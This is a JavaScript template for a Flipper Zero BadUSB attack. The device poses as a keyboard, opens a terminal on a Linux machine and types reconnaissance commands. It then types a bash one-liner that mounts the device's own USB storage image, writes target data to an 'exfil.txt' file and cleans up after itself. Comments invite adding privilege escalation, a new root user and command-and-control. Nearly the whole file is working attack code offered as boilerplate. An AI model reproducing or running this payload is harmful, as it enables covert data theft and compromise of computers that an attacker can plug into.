//
//     __     ______     ______   ______     __         __  __    
//    /\ \   /\  ___\   /\__  _\ /\  == \   /\ \       /\ \/ /    
//   _\_\ \  \ \  __\   \/_/\ \/ \ \  __<   \ \ \____  \ \  _"-.  
//  /\_____\  \ \_____\    \ \_\  \ \_____\  \ \_____\  \ \_\ \_\ 
//  \/_____/   \/_____/     \/_/   \/_____/   \/_____/   \/_/\/_/ 
// 
//                                                             
// JavaScript App Template
// Version 1.0
//
// Author: JetBlk (https://github.com/jetblk || https://discord.com/users/415611606408364062/)
// 
// This script is to act as boilerplate for a BadUSB + USB Mass Storage app setup.
// Execution example would be handled in multiple phases: primary and secondary.
// Primary phase will execute some commands, secondary phase will be used for exfiltrating data.
//
// ************ Tested on Momentum Firmware Dev Build 6608b896 (April 10, 2024) ************
//
// Example - Environment: Linux
// - Primary Phase: Elevate privledges to root utilizing any method you wish
// - Secondary Phase: Now that you have root access, Exfil data to USB Mass storage
// - Further phases can be added for creating a new root user, establishing c2, etc
//

let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");
let dialog = require("dialog");

// ************
// IMPORTANT: Be sure this matches your computer keyboard layout!!!
// See /ext/badusb/assets/layouts/ for list of supported keyboard layouts.
let layout = "en-US";

// ************
// Executes BadUSB commands with the ability to print to the F0 screen as the script executes, then have an optional delay.
//
// 'command' is required, 'message' and 'delay' are optional
function sendToConsole(script)
{
    // script.message, script.command, script.delay
    for (let i = 0; i < script.length; i++) {
        if(script[i].message) print(script[i].message); // F0 screen message
        badusb.println(script[i].command);              // BadUSB command to execute
        if(script[i].delay) delay(script[i].delay);     // Delay
    }
}

// ************
// Storage definition for data exfil
let imageName = "PHUN";
let image = "/ext/apps_data/mass_storage/" + imageName + ".img";
let size = 8 * 1024 * 1024;

// ************
// Primary Script Definition - This example does not include code to elevate privledges
//
// 'command' is required, 'message' and 'delay' are optional
let primary = [
    { message: "Executing: id", command: "id", delay: 5000 },
    { message: "Executing: uname -a", command: "uname -a", delay: 1000 },
];

// ************
// Secondary Script Definition (Exfil)
//
// 'command' is required, 'message' and 'delay' are optional
let secondary = [
    { message: "USB Mount and exfil...", command: "bash -c '", delay: 10 },
    { command: "img=" + imageName + ";", delay: 10 },
    { command: "disk=/dev/disk/by-id/usb-Flipper_Mass_Storage_$img-0:0;", delay: 10 },
    { command: "part=$disk-part1;", delay: 10 },
    { command: "while [ ! -b $part ];do sleep 1;done;", delay: 10 },
    { command: "mnt=$(mktemp -d);", delay: 10 },
    { command: "date=$(date +%Y-%m-%d);", delay: 10 },  // Current Date in YYYY-MM-DD format - see below
    { command: "time=$(date +%s);", delay: 10 },        // Current timestamp - Use the combination of $date and $time to create unique folders/files
    { command: "sudo mount $part $mnt;", delay: 10 },
    { command: "id > $mnt/exfil.txt", delay: 10 },  // exfil whatever you want
    { command: "sync $mnt/exfil.txt;", delay: 10 },
    { command: "sudo umount $part", delay: 10 },
    { command: "sudo eject $disk;", delay: 10 },
    { command: "rm -rf $mnt", delay: 10 },
    { command: "'&disown;exit", delay: 10 },
];

// ************
// Get storage ready
print("Checking for Image...");
if (storage.exists(image)) {
    print ("Storage Exists.");
}
else {
	print ("Creating Storage...");
	usbdisk.createImage(image, size);
}

// ************
// Setup BadUSB connection
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Flipper", prod_name: "Zero", layout_path: "/ext/badusb/assets/layouts/" + layout + ".kl" });
print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

// ************
// Show a dialog to pause execution until ready
dialog.message("USB is connected. Bombs away?", "Press OK to start");

// ************
// Open Terminal
badusb.press("CTRL", "ALT", "t");
delay(500);

// ************
// Execute Primary Script
print("Phase 1 executing...");
sendToConsole(primary);
print("Phase 1 complete.");
delay(500);

// ************
// Execute Secondary Script (Exfil)
print("Phase 2 executing...");
sendToConsole(secondary);
print("Phase 2 complete.");
delay(500);

// ************
// Detach Keyboard
badusb.quit();

// ************
// Wait for typing to finish and attach storage, eject and finish
delay(2000);
usbdisk.start(image);
print("Please wait until the terminal closes to eject.");

while (!usbdisk.wasEjected()) {
    delay(1000);
}
usbdisk.stop();
print("Script Complete.");